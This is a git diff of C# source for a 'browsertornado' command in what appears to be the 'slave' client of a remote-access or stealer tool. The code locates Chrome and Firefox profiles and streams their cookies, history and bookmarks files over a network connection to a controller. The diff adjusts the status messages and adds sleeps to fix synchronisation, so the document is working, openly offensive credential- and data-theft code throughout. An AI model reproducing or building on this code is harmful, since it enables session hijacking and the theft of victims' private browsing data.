@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.Threading;
 using Shared;
 
 namespace Slave.Commands
@@ -10,6 +11,9 @@ namespace Slave.Commands
         public string name { get; } = "browsertornado";
 
 
+        /// <summary>
+        /// Remark : Thread.Sleep(50) are necessary has there is a sync problem if they aren't used
+        /// </summary>
         public void Process(List<string> args)
         {
             var chromePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
@@ -20,26 +24,30 @@ namespace Slave.Commands
 
             if (Directory.Exists(chromePath))
             {
-                GlobalCommandsManager.networkManager.WriteLine("chrome|OK");
+                GlobalCommandsManager.networkManager.WriteLine("OK");
+                Thread.Sleep(50);
                 FindAndSendFile(chromePath, "Cookies");
                 FindAndSendFile(chromePath, "History");
                 FindAndSendFile(chromePath, "Bookmarks");
             }
             else
             {
-                GlobalCommandsManager.networkManager.WriteLine("chrome|KO");
+                GlobalCommandsManager.networkManager.WriteLine("KO");
             }
+
+            Thread.Sleep(50);
 
             if (Directory.Exists(firefoxPath))
             {
-                GlobalCommandsManager.networkManager.WriteLine("firefox|OK");
+                GlobalCommandsManager.networkManager.WriteLine("OK");
+                Thread.Sleep(50);
                 firefoxPath = Path.Combine(Directory.GetDirectories(firefoxPath)[0]);
                 FindAndSendFile(firefoxPath, "cookies.sqlite");
                 FindAndSendFile(firefoxPath, "places.sqlite");
             }
             else
             {
-                GlobalCommandsManager.networkManager.WriteLine("firefox|KO");
+                GlobalCommandsManager.networkManager.WriteLine("KO");
             }
         }
 
@@ -53,17 +61,20 @@ namespace Slave.Commands
                 {
                     using (var fs = new FileStream(filepath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                     {
-                        GlobalCommandsManager.networkManager.WriteLine($"{filename}|OK");
+                        GlobalCommandsManager.networkManager.WriteLine("OK");
+                        Thread.Sleep(50);
                         GlobalCommandsManager.networkManager.StreamToNetworkStream(fs);
                     }
                 }
                 catch (IOException)
                 {
-                    // Ignored, will send the error message below
+                    GlobalCommandsManager.networkManager.WriteLine("KO");
                 }
             }
-
-            GlobalCommandsManager.networkManager.WriteLine($"{filename}|KO");
+            else
+            {
+                GlobalCommandsManager.networkManager.WriteLine("KO");
+            }
         }
     }
 }
